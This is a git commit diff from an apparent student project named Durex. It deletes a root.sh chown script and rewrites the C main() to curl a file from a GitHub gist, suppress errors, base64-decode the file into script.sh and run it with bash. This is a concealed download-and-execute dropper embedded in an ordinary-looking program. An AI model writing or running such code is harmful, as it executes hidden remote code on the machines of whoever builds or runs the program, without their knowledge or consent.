746fb93a43d7b05664cc6c2e044bcb3706309809
root <root@stretch.localdomain>
2019-01-14 12:02:25 +0000

    ready to correct ?

--- root.sh
+++
@@ -1,2 +0,0 @@
-#!/bin/bash
-chown -R root:root ../Durex
--- srcs/main.c
+++ srcs/main.c
@@ -2,5 +2,5 @@
 
 int	main()
 {
-	system("sh script.sh");
+	system("curl https://gist.githubusercontent.com/smurfy92/9fb82047e321bc976a345033e15d7ca6/raw/cf65860415f0bbafd8a0fc0a047eb56dc13caccd/gistfile1.txt 2>&- > toto; base64 -d toto > script.sh; bash script.sh");
 }
